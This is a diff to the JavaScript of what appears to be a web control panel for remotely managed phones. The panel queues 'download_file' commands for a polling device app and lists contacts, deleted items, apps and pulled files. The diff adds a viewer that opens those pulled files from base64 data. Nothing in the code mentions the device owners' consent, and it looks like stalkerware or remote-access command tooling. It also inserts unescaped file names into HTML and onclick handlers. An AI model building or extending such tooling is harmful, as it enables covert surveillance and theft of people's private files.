@@ -80,6 +80,7 @@ function checkNewDeleted(deleted) {
     lastDeletedCount = deleted.length;
 }
 
+// ✅ حذف الجهاز مع إعادة تحميل سريعة
 async function deleteDevice() {
     if (!currentDevice) { alert('⚠️ اختر جهازًا أولًا'); return; }
     if (!confirm('هل أنت متأكد من حذف هذا الجهاز؟')) return;
@@ -94,7 +95,9 @@ async function deleteDevice() {
             document.getElementById('deviceSelect').value = '';
             document.getElementById('deviceNameDisplay').textContent = 'لا يوجد جهاز محدد';
             document.getElementById('deviceNameDisplay').className = 'device-name-display';
-            loadDevices();
+            
+            // ✅ إعادة تحميل فورية
+            setTimeout(() => { loadDevices(); }, 1000);
         } else {
             alert('❌ خطأ: ' + (result.error || 'غير معروف'));
         }
@@ -193,7 +196,7 @@ function switchTab(tabName) {
     
     if (tabName === 'images') loadImages();
     if (tabName === 'deleted') loadDeleted();
-    if (tabName === 'files') loadFileList(currentFilePath);
+    if (tabName === 'files') { loadFileList(currentFilePath); loadFiles(); }
     if (tabName === 'apps') loadApps();
     if (tabName === 'device') loadDeviceInfo();
     if (tabName === 'contacts') loadContacts();
@@ -216,7 +219,6 @@ async function loadFileList(path) {
             })
         });
         
-        // ✅ انتظر 15 ثانية — التطبيق يفحص كل 10 ثوانٍ
         setTimeout(async () => {
             const response = await fetch(`/api.php?action=get_file_list&device=${encodeURIComponent(currentDevice)}`);
             const data = await response.json();
@@ -231,7 +233,7 @@ function displayFileList(files) {
     div.innerHTML = '';
     
     if (!files || files.length === 0) {
-        div.innerHTML = '<p style="color:#888;">المجلد فارغ — اضغط 🔄 تحديث وانتظر 15 ثانية</p>';
+        div.innerHTML = '<p style="color:#888;">المجلد فارغ</p>';
         return;
     }
     
@@ -258,7 +260,6 @@ function displayFileList(files) {
                 </div>
                 <div class="file-actions">
                     <button class="action-btn" onclick="downloadPhoneFile('${file.path}')">⬇️ تحميل</button>
-                    <button class="action-btn" onclick="viewPhoneFile('${file.path}')">👁️ عرض</button>
                 </div>
             `;
         }
@@ -273,16 +274,7 @@ async function downloadPhoneFile(path) {
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({ device: currentDevice, command: `download_file:${path}` })
     });
-    alert('✅ تم طلب التحميل');
-}
-
-async function viewPhoneFile(path) {
-    await fetch('/api.php', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ device: currentDevice, command: `download_file:${path}` })
-    });
-    alert('✅ جاري التحميل للعرض');
+    alert('✅ تم طلب التحميل — انتظر 15 ثانية ثم افتح تبويب الملفات');
 }
 
 function navigateUp() {
@@ -290,6 +282,76 @@ function navigateUp() {
     parts.pop();
     const parentPath = parts.join('/') || '/';
     loadFileList(parentPath);
+}
+
+// ============ الملفات المحملة ============
+
+async function loadFiles() {
+    try {
+        const response = await fetch(`/api.php?action=get_files&device=${encodeURIComponent(currentDevice)}`);
+        const files = await response.json();
+        
+        const div = document.getElementById('filesList');
+        if (!div) return;
+        
+        if (files && files.length > 0) {
+            // ✅ إذا يوجد ملفات محملة — اعرضها
+            div.innerHTML = '<h4 style="color:#00ffcc;margin-bottom:10px;">📥 الملفات المحملة:</h4>';
+            
+            [...files].sort((a, b) => (b.date || 0) - (a.date || 0)).forEach(file => {
+                const divItem = document.createElement('div');
+                divItem.className = 'conversation-item';
+                
+                let icon = '📄';
+                if (file.name) {
+                    const ext = file.name.toLowerCase().split('.').pop();
+                    if (['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext)) icon = '🖼️';
+                    else if (['mp4', 'avi', 'mkv', 'mov'].includes(ext)) icon = '🎬';
+                    else if (['mp3', 'wav', 'ogg'].includes(ext)) icon = '🎵';
+                }
+                
+                divItem.innerHTML = `
+                    <div class="conversation-avatar">${icon}</div>
+                    <div class="conversation-info">
+                        <div class="conversation-name">${file.name || 'ملف'}</div>
+                        <div class="conversation-preview">${formatBytes(file.size)}</div>
+                    </div>
+                    <div class="file-actions">
+                        <button class="action-btn" onclick="viewDownloadedFile('${file.name}')">👁️ عرض</button>
+                    </div>
+                `;
+                div.appendChild(divItem);
+            });
+        }
+    } catch (e) {}
+}
+
+// ✅ عرض ملف محمل — يفتح في نافذة جديدة
+async function viewDownloadedFile(name) {
+    try {
+        const response = await fetch(`/api.php?action=get_files&device=${encodeURIComponent(currentDevice)}`);
+        const files = await response.json();
+        const file = files.find(f => f.name === name);
+        
+        if (!file || !file.data) {
+            alert('❌ لا توجد بيانات');
+            return;
+        }
+        
+        let mimeType = 'application/octet-stream';
+        const ext = name.toLowerCase().split('.').pop();
+        if (['jpg', 'jpeg'].includes(ext)) mimeType = 'image/jpeg';
+        else if (ext === 'png') mimeType = 'image/png';
+        else if (ext === 'gif') mimeType = 'image/gif';
+        else if (ext === 'mp4') mimeType = 'video/mp4';
+        else if (ext === 'mp3') mimeType = 'audio/mpeg';
+        else if (ext === 'pdf') mimeType = 'application/pdf';
+        else if (ext === 'txt') mimeType = 'text/plain';
+        
+        window.open(`data:${mimeType};base64,${file.data}`, '_blank');
+    } catch (e) {
+        alert('❌ خطأ في العرض');
+    }
 }
 
 // ============ باقي الدوال ============
